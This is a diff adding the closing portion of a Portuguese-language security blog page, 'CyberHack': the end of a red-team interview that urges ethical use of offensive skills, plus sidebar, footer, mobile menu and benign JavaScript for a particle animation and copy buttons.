+                                    E um último conselho: mantenha uma bússola ética forte. Na segurança ofensiva, a linha entre habilidades úteis e potencialmente prejudiciais é tênue. Use seu conhecimento para melhorar a segurança, não para comprometê-la.
+                                </div>
+                            </div>
+                            
+                            <div class="tags">
+                                <span class="tag">Red Team</span>
+                                <span class="tag">Entrevista</span>
+                                <span class="tag">Pentesting</span>
+                                <span class="tag">Segurança Ofensiva</span>
+                                <span class="tag">Carreira</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="pagination">
+                    <a href="#" class="pagination-arrow prev"><i class="fas fa-chevron-left"></i></a>
+                    <a href="#" class="pagination-item active">1</a>
+                    <a href="#" class="pagination-item">2</a>
+                    <a href="#" class="pagination-item">3</a>
+                    <span class="pagination-item dots">...</span>
+                    <a href="#" class="pagination-item">8</a>
+                    <a href="#" class="pagination-arrow next"><i class="fas fa-chevron-right"></i></a>
+                </div>
+            </div>
+            
+            <div class="blog-sidebar">
+                <div class="sidebar-widget">
+                    <h3 class="widget-title">Pesquisar</h3>
+                    <div class="subscribe-form">
+                        <input type="text" placeholder="O que você procura?">
+                        <button type="submit"><i class="fas fa-search"></i> Buscar</button>
+                    </div>
+                </div>
+                
+                <div class="sidebar-widget">
+                    <h3 class="widget-title">Categorias</h3>
+                    <ul style="list-style-type: none; padding: 0;">
+                        <li style="margin-bottom: 10px;"><a href="#" style="text-decoration: none; color: rgba(255, 255, 255, 0.8); display: flex; justify-content: space-between; transition: all 0.3s ease;"><span>Vulnerabilidades</span> <span>23</span></a></li>
+                        <li style="margin-bottom: 10px;"><a href="#" style="text-decoration: none; color: rgba(255, 255, 255, 0.8); display: flex; justify-content: space-between; transition: all 0.3s ease;"><span>Pentesting</span> <span>45</span></a></li>
+                        <li style="margin-bottom: 10px;"><a href="#" style="text-decoration: none; color: rgba(255, 255, 255, 0.8); display: flex; justify-content: space-between; transition: all 0.3s ease;"><span>Ferramentas</span> <span>19</span></a></li>
+                        <li style="margin-bottom: 10px;"><a href="#" style="text-decoration: none; color: rgba(255, 255, 255, 0.8); display: flex; justify-content: space-between; transition: all 0.3s ease;"><span>Tutoriais</span> <span>37</span></a></li>
+                        <li style="margin-bottom: 10px;"><a href="#" style="text-decoration: none; color: rgba(255, 255, 255, 0.8); display: flex; justify-content: space-between; transition: all 0.3s ease;"><span>Análises</span> <span>15</span></a></li>
+                        <li style="margin-bottom: 10px;"><a href="#" style="text-decoration: none; color: rgba(255, 255, 255, 0.8); display: flex; justify-content: space-between; transition: all 0.3s ease;"><span>Entrevistas</span> <span>8</span></a></li>
+                        <li style="margin-bottom: 10px;"><a href="#" style="text-decoration: none; color: rgba(255, 255, 255, 0.8); display: flex; justify-content: space-between; transition: all 0.3s ease;"><span>Notícias</span> <span>42</span></a></li>
+                    </ul>
+                </div>
+                
+                <div class="sidebar-widget popular-posts">
+                    <h3 class="widget-title">Artigos Populares</h3>
+                    <div class="popular-post">
+                        <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=2070&auto=format&fit=crop" alt="Artigo popular">
+                        <div class="popular-post-content">
+                            <h4>Análise de malware avançado: técnicas e ferramentas</h4>
+                            <span class="post-date">08/06/2025</span>
+                        </div>
+                    </div>
+                    <div class="popular-post">
+                        <img src="https://images.unsplash.com/photo-1563089145-599997674d42?q=80&w=2070&auto=format&fit=crop" alt="Artigo popular">
+                        <div class="popular-post-content">
+                            <h4>Como configurar VPNs para máximo anonimato</h4>
+                            <span class="post-date">01/06/2025</span>
+                        </div>
+                    </div>
+                    <div class="popular-post">
+                        <img src="https://images.unsplash.com/photo-1614064641938-3bbee52942c7?q=80&w=2070&auto=format&fit=crop" alt="Artigo popular">
+                        <div class="popular-post-content">
+                            <h4>Segurança de APIs: vulnerabilidades comuns</h4>
+                            <span class="post-date">25/05/2025</span>
+                        </div>
+                    </div>
+                    <div class="popular-post">
+                        <img src="https://images.unsplash.com/photo-1607799279861-4dd421887fb3?q=80&w=2070&auto=format&fit=crop" alt="Artigo popular">
+                        <div class="popular-post-content">
+                            <h4>Um guia prático para Pentesting de aplicações mobile</h4>
+                            <span class="post-date">18/05/2025</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="sidebar-widget">
+                    <h3 class="widget-title">Tags</h3>
+                    <div class="tag-cloud">
+                        <span class="tag">Kali Linux</span>
+                        <span class="tag">Metasploit</span>
+                        <span class="tag">Burp Suite</span>
+                        <span class="tag">OSINT</span>
+                        <span class="tag">Wifi</span>
+                        <span class="tag">Forense</span>
+                        <span class="tag">Bluetooth</span>
+                        <span class="tag">IoT</span>
+                        <span class="tag">Docker</span>
+                        <span class="tag">Cloud</span>
+                        <span class="tag">Reversing</span>
+                        <span class="tag">Web3</span>
+                        <span class="tag">AI</span>
+                        <span class="tag">Red Team</span>
+                        <span class="tag">Blue Team</span>
+                    </div>
+                </div>
+                
+                <div class="sidebar-widget">
+                    <h3 class="widget-title">Newsletter</h3>
+                    <p style="font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-bottom: 15px;">Receba as últimas notícias, tutoriais e atualizações sobre segurança digital diretamente no seu e-mail.</p>
+                    <div class="subscribe-form">
+                        <input type="email" placeholder="Seu melhor e-mail">
+                        <button type="submit">Inscrever-se</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-logo">CyberHack</div>
+                <div class="footer-links">
+                    <a href="#">Termos de Uso</a>
+                    <a href="#">Política de Privacidade</a>
+                    <a href="#">FAQ</a>
+                    <a href="contato.html">Contato</a>
+                </div>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-discord"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="overlay"></div>
+    <div class="mobile-menu">
+        <button class="mobile-menu-close">
+            <i class="fas fa-times"></i>
+        </button>
+        <div class="mobile-nav-links">
+            <a href="index.html" class="mobile-home-btn"><i class="fas fa-home"></i> Home</a>
+            <a href="#vulnerabilidades">Vulnerabilidades</a>
+            <a href="#ferramentas">Ferramentas</a>
+            <a href="#tutoriais">Tutoriais</a>
+            <a href="#entrevistas">Entrevistas</a>
+            <a href="downloads.html">Downloads</a>
+            <a href="kali.html">Kali Linux</a>
+            <a href="wifi.html">Wi-Fi Pentesting</a>
+            <a href="osint.html">OSINT Avançado</a>
+            <a href="forense.html">Forense Digital</a>
+            <a href="senhas.html">Hack de Senhas</a>
+            <a href="comunidade.html">Comunidade</a>
+            <a href="contato.html">Contato</a>
+        </div>
+    </div>
+    
+    <div class="digital-numbers">ID: <span id="random-numbers">29384756</span></div>
+    
+    <a href="#" class="scroll-top">
+        <i class="fas fa-chevron-up"></i>
+    </a>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Canvas background
+            const canvas = document.getElementById('canvas');
+            const renderer = new THREE.WebGLRenderer({
+                canvas,
+                antialias: true,
+                alpha: true
+            });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setPixelRatio(window.devicePixelRatio);
+
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 5;
+
+            const particlesGeometry = new THREE.BufferGeometry();
+            const particlesCount = 2000;
+            
+            const positions = new Float32Array(particlesCount * 3);
+            const colors = new Float32Array(particlesCount * 3);
+            const sizes = new Float32Array(particlesCount);
+            
+            for (let i = 0; i < particlesCount * 3; i += 3) {
+                positions[i] = (Math.random() - 0.5) * 20;
+                positions[i + 1] = (Math.random() - 0.5) * 20;
+                positions[i + 2] = (Math.random() - 0.5) * 20;
+                
+                colors[i] = Math.random() * 0.5 + 0.5;
+                colors[i + 1] = Math.random() * 0.2;
+                colors[i + 2] = Math.random() * 0.5 + 0.5;
+                
+                sizes[i/3] = Math.random() * 0.5 + 0.5;
+            }
+            
+            particlesGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+            particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+            particlesGeometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));
+            
+            const particlesMaterial = new THREE.PointsMaterial({
+                size: 0.1,
+                vertexColors: true,
+                transparent: true,
+                opacity: 0.8,
+                sizeAttenuation: true,
+                map: createCircleTexture()
+            });
+            
+            function createCircleTexture() {
+                const canvas = document.createElement('canvas');
+                canvas.width = 64;
+                canvas.height = 64;
+                
+                const context = canvas.getContext('2d');
+                context.clearRect(0, 0, canvas.width, canvas.height);
+                
+                const centerX = canvas.width / 2;
+                const centerY = canvas.height / 2;
+                const radius = canvas.width / 2.5;
+                
+                context.beginPath();
+                context.arc(centerX, centerY, radius, 0, 2 * Math.PI, false);
+                
+                const gradient = context.createRadialGradient(centerX, centerY, 0, centerX, centerY, radius);
+                gradient.addColorStop(0, 'rgba(255, 255, 255, 1)');
+                gradient.addColorStop(0.5, 'rgba(255, 105, 180, 0.8)');
+                gradient.addColorStop(1, 'rgba(255, 105, 180, 0)');
+                
+                context.fillStyle = gradient;
+                context.fill();
+                
+                const texture = new THREE.Texture(canvas);
+                texture.needsUpdate = true;
+                return texture;
+            }
+            
+            const particles = new THREE.Points(particlesGeometry, particlesMaterial);
+            scene.add(particles);
+
+            let mouseX = 0;
+            let mouseY = 0;
+            let targetX = 0;
+            let targetY = 0;
+            
+            document.addEventListener('mousemove', (event) => {
+                mouseX = (event.clientX / window.innerWidth) * 2 - 1;
+                mouseY = -(event.clientY / window.innerHeight) * 2 + 1;
+            });
+
+            function animate() {
+                requestAnimationFrame(animate);
+                
+                targetX = mouseX * 0.2;
+                targetY = mouseY * 0.2;
+                
+                particles.rotation.x += 0.0005;
+                particles.rotation.y += 0.001;
+                
+                particles.rotation.y += (targetX - particles.rotation.y) * 0.05;
+                particles.rotation.x += (targetY - particles.rotation.x) * 0.05;
+                
+                const positions = particles.geometry.attributes.position.array;
+                for (let i = 0; i < positions.length; i += 3) {
+                    positions[i + 1] += Math.sin(Date.now() * 0.001 + positions[i] * 0.1) * 0.002;
+                }
+                particles.geometry.attributes.position.needsUpdate = true;
+                
+                renderer.render(scene, camera);
+            }
+
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+
+            animate();
+            
+            // Mobile menu
+            const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+            const mobileMenu = document.querySelector('.mobile-menu');
+            const mobileMenuClose = document.querySelector('.mobile-menu-close');
+            const overlay = document.getElementById('overlay');
+            
+            mobileMenuBtn.addEventListener('click', () => {
+                mobileMenu.classList.add('active');
+                overlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+            
+            mobileMenuClose.addEventListener('click', () => {
+                mobileMenu.classList.remove('active');
+                overlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+            
+            overlay.addEventListener('click', () => {
+                mobileMenu.classList.remove('active');
+                overlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+            
+            // Category buttons
+            const categoryBtns = document.querySelectorAll('.category-btn');
+            categoryBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    categoryBtns.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                });
+            });
+            
+            // Copy code buttons
+            const copyBtns = document.querySelectorAll('.copy-btn');
+            copyBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const codeBlock = this.closest('.code-box').querySelector('code');
+                    const textArea = document.createElement('textarea');
+                    textArea.value = codeBlock.textContent;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    
+                    const originalText = this.innerHTML;
+                    this.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                    setTimeout(() => {
+                        this.innerHTML = originalText;
+                    }, 2000);
+                });
+            });
+            
+            // Scroll to top button
+            const scrollTopBtn = document.querySelector('.scroll-top');
+            
+            window.addEventListener('scroll', () => {
+                if (window.pageYOffset > 300) {
+                    scrollTopBtn.classList.add('active');
+                } else {
+                    scrollTopBtn.classList.remove('active');
+                }
+            });
+            
+            scrollTopBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.scrollTo({
+                    top: 0,
+                    behavior: 'smooth'
+                });
+            });
+            
+            // Random numbers
+            setInterval(() => {
+                document.getElementById('random-numbers').textContent = Math.floor(Math.random() * 100000000).toString();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
